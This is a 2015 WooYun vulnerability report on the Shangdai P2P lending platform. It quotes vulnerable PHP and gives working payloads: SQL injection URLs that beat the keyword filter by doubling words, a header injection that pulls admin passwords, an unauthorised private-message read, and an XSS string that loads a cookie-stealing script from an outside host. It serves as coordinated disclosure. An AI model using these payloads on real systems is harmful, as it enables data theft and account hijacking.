{"id": 72222, "wybug_id": "wooyun-2015-0142675", "wybug_title": "尚贷p2p网贷系统二处sql注入/越权/xss(demo成功)", "wybug_corp": "shangdaixitong.com", "wybug_author": "牛肉包子", "wybug_date": "2015-09-22 17:10", "wybug_open_date": "2015-12-22 14:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-22：\t细节向公众公开  简要描述： 只求个首页。还是有安全狗。但是还是没什么卵用。 详细说明：  注入1（测试不成功）看到代码core\\deayou.core.php 65-86行处\nelseif ($_G['query_site'] == 'home') {\t$user_id = $_REQUEST['user_id'];\tif ($user_id == '') \t{\t\t$user_id = $_G['user_id'];\t}\t$_G['article_id'] = $user_id;\t$magic->assign('_G', $_G);\tusersClass::AddVisit(array('user_id' => $user_id, 'visit_userid' => $_G['user_id']));\tif ($home_dir != '') \t{\t\t$magic->template_dir = $home_dir;\t\t$magic->assign('tpldir', '/' . $home_dir);\t\t$magic->display($home_template);\t}\telse \t{\t\t$magic->display('home.html');\t}\tdie;}\n然后继续更近\n/**     * 最近来访     * @param $param array('user_id' => '会员ID')     * @return bool true/false     */    public static function AddVisit($data = array()) {        global $mysql;        if (isset($data['visit_userid']) && $data['visit_userid'] != \"\" && $data['user_id'] != $data['visit_userid']) {            $time = time();            $ip = ip_address();            $sql = \"select id from `{users_visit}` where user_id={$data['user_id']} and visit_userid = {$data['visit_userid']}\";            $result = $mysql->db_fetch_array($sql);            //判断是否            if ($result != false) {                $sql = \"update `{users_visit}` set addtime='{$time}',addip='{$ip}' where id='{$result['id']}'\";                $mysql->db_query($sql);            } else {                $sql = \"insert into `{users_visit}` set user_id='{$data['user_id']}',visit_userid='{$data['visit_userid']}',addtime='{$time}',addip='{$ip}'\";                $mysql->db_query($sql);            }            //如果超过10条，则删除最早的一条            $sql = \"select count(1) as num from `{users_visit}` where user_id={$data['user_id']}\";            $result = $mysql->db_fetch_array($sql);            if ($result['num'] > 20) {                $sql = \"select id from `{users_visit}` where user_id={$data['user_id']} order by addtime asc\";                $result = $mysql->db_fetch_array($sql);                $sql = \"delete from `{users_visit}` where id='{$result['id']}'\";                $mysql->db_query($sql);            }        }    }\n其中user_id没有被单引号包裹，所以造成注入。然后有个全局过滤sql的函数。\nfunction inject_check($sql_str) {\t$sql = array('select', 'insert', '\\\\\\'', '\\\\/\\\\*', '\\\\.\\\\.\\\\/', '\\\\.\\\\/', 'union', 'into', 'load_file', 'outfile');\t$sql_re = array('', '', '', '', '', '', '', '', '', '', '', '');\treturn str_replace($sql, $sql_re, $sql_str);}\n写两次就绕过了。然后也使安全狗失效了。\nhttp://demo2.tuanshang.net/?home&user_id=updatexml(1,concat(1,(seselectlect+database())),1)\n\n\n注入二modules/message/message.inc.php\nelseif ($_U['query_type'] == \"senteds\"){\t\t\t\t\tif (isset($_POST['type']) && $_POST['type']==2){\t\t\t\t\t\t$data['id'] = $_POST['id'];\t\t\t$data['sent_user'] = $_G['user_id'];\t\t\t$data['sented'] = 0;\t\t\t$result = messageClass::update($data);\t\t\tif ($result!==true){\t\t\t\t$msg = array($MsgInfo[$result],\"\",$_U['query_url']);\t\t\t}else{\t\t\t\t$msg = array(\"操作成功\");\t\t\t}\t\t\t\t\t}else{\t\t\t/* $data['sent_user'] = $_G['user_id'];\t\t\t$data['page'] = $_U['page'];\t\t\t$data['epage'] = $_U['epage'];\t\t\t$data['sented'] = 1;\t\t\t$result = messageClass::GetList($data);\t\t\tif (is_array($result)){\t\t\t\t$pages->set_data($result);\t\t\t\t$_U['message_list'] = $result['list'];\t\t\t\t$_U['show_page'] = $pages->show(3);\t\t\t}else{\t\t\t\t$msg = array($result,\"\",$_U['query_url']);\t\t\t} */\t\t\tif (isset($_REQUEST['id']) ){\t\t\t\t$data['id'] = $_REQUEST['id'];\t\t\t\t$data['user_id'] = $_G['user_id'];\t\t\t\t$result = messageClass::DeleteMessageReceive($data);\t\t\t\tif ($result>0){\t\t\t\t\t$msg = array(\"删除成功\",\"\",\"/?user&q=code/message\");\t\t\t\t}else{\t\t\t\t\t$msg = array($MsgInfo[$result]);\t\t\t\t}\t\t\t}else{\t\t\t\t$msg = array(\"请选中再进行操作\");\t\t\t}\t\t\t\t}\t}\n然后跟进DeleteMessageReceive函数\nfunction DeleteMessageReceive($data = array()){\t\tglobal $mysql;\t\t\t\tif (!IsExiest($data['id'])) return \"message_receive_id_empty\";\t\tif (is_array($data['id'])){\t\t\t$data['id'] = join(\",\",$data['id']);\t\t}\t\t$_sql = \" where id in ({$data['id']})\";\t\tif (isset($data['user_id']) && $data['user_id']!=\"\"){\t\t\t$_result = self::GetMessageReceiveOne($data);\t\t\t\t\t\t$_sql .= \" and user_id='{$data['user_id']}' and type='user'\";\t\t\t$sql = \"delete from `{message_receive}` {$_sql}\";\t\t\t$mysql -> db_query($sql);\t\t\tif ($_result['type']!='user'){\t\t\t\t$sql = \"delete from `{message_receive}` where user_id='{$data['user_id']}' and receive_value='{$data['id']}'\";\t\t\t\t$mysql -> db_query($sql);\t\t\t}\t\t\treturn $data['user_id'];\t\t}else{\t\t\t$sql = \"delete from `{message_receive}` {$_sql}\";\t\t\t$mysql -> db_query($sql);\t\t}\t\treturn $data['id'];\t}\n可以看到$id可以注入\nhttp://demo2.tuanshang.net/?user&q=code/message/sentdeledid%5B0%5D=8) or updatexml(1,concat(1,(seselectlect+user())),1&type=1\n\n\nmodules/message/message.inc.php\nelseif ($_U['query_type'] == \"sentdeled\"){\t\tif (isset($_REQUEST['id']) ){\t\t$data['id'] = $_REQUEST['id'];\t\t$data['user_id'] = $_G['user_id'];\t\t$result = messageClass::DeleteMessage($data);\t\tif ($result>0){\t\t\t$msg = array($MsgInfo[\"message_action_success\"],\"\",\"/?user&q=code/message/sented\");\t\t}else{\t\t\t$msg = array($MsgInfo[$result]);\t\t}\t}else{\t\t$msg = array(\"请选中再进行操作\");\t}}\n跟进\nfunction DeleteMessage($data = array()){\t\tglobal $mysql;\t\t\t\tif (!IsExiest($data['id'])) return \"message_id_empty\";\t\tif (is_array($data['id'])){\t\t\t$data['id'] = join(\",\",$data['id']);\t\t}\t\t$_sql = \" where id in ({$data['id']})\";\t\tif (isset($data['user_id']) && $data['user_id']!=\"\"){\t\t\t$_sql .= \" and user_id='{$data['user_id']}' \";\t\t}\t\t$sql = \"delete from `{message}` {$_sql}\";\t\t$mysql -> db_query($sql);\t\treturn 1;\t}\n然后id也可以注入\nhttp://demo2.tuanshang.net/?user&q=code/message/sentedsid%5B0%5D=8) or updatexml(1,concat(1,(seselectlect+user())),1&type=1\n\n\n注入3\nfunction ip_address() {\tif(!empty($_SERVER[\"HTTP_CLIENT_IP\"])) \t{\t\t$ip_address = $_SERVER[\"HTTP_CLIENT_IP\"];\t}\telse if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"]))\t{\t\t$ip_address = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));\t}\telse if(!empty($_SERVER[\"REMOTE_ADDR\"]))\t{\t\t$ip_address = $_SERVER[\"REMOTE_ADDR\"];\t}\telse\t{\t\t$ip_address = '';\t}\treturn $ip_address;}\n然后\npublic static function AddVisit($data = array()) {        global $mysql;        if (isset($data['visit_userid']) && $data['visit_userid'] != \"\" && $data['user_id'] != $data['visit_userid']) {            $time = time();            $ip = ip_address();            $sql = \"select id from `{users_visit}` where user_id={$data['user_id']} and visit_userid = {$data['visit_userid']}\";            $result = $mysql->db_fetch_array($sql);            //判断是否            if ($result != false) {                $sql = \"update `{users_visit}` set addtime='{$time}',addip='{$ip}' where id='{$result['id']}'\";                $mysql->db_query($sql);            } else {                $sql = \"insert into `{users_visit}` set user_id='{$data['user_id']}',visit_userid='{$data['visit_userid']}',addtime='{$time}',addip='{$ip}'\";                $mysql->db_query($sql);            }            //如果超过10条，则删除最早的一条            $sql = \"select count(1) as num from `{users_visit}` where user_id={$data['user_id']}\";            $result = $mysql->db_fetch_array($sql);            if ($result['num'] > 20) {                $sql = \"select id from `{users_visit}` where user_id={$data['user_id']} order by addtime asc\";                $result = $mysql->db_fetch_array($sql);                $sql = \"delete from `{users_visit}` where id='{$result['id']}'\";                $mysql->db_query($sql);            }        }    }\n这儿存在注入设置X-FORWARED-FOR为\nxxx' or EXP(~(select * from (select password from tuanshang_users_admin limit 1)a)) or '\n\n\n注入5\nhttp://demo2.tuanshang.net/?user&q=code/message/sent\n发送信息的时候\n\n越权任意读取站内信\nhttp://demo2.tuanshang.net/?user&q=code/message/viewed&id=1\n其中变换id的值就行了。\n\n\n\nxss在发送私信处存在xss。简单的fuzz了一下。然后成功绕过过滤。在内容处构造\n<input onfocus=$.getScript(\"http://lennyxss.sinaapp.com/sPGu9l?1442846067\") autofocus>\n成功获取cookie\n\n\n\n   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  过滤+转义   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-23 14:15 厂商回复： 感谢白帽们的辛苦，该漏洞为V3演示系统所存在的问题，我们将所述问题进行排查修复，同时我们将加强安全漏洞排查，将安全问题放到首位，欢迎对我们的系统安全性继续监督，我们的成长离不开大家的指导和帮助。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-22 17:14 |    \t\t%270x5c \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:26        | 乌拉拉)\t\t \n  膜拜    \n     2015-09-22 17:15 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  献上膝盖    \n     2015-09-22 17:20 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:670 漏洞数:157        | =============================是=========...)\t\t \n  牛肉包子    \n     2015-09-22 20:06 |    \t\t小震 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | ~)\t\t \n  这个牛逼。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}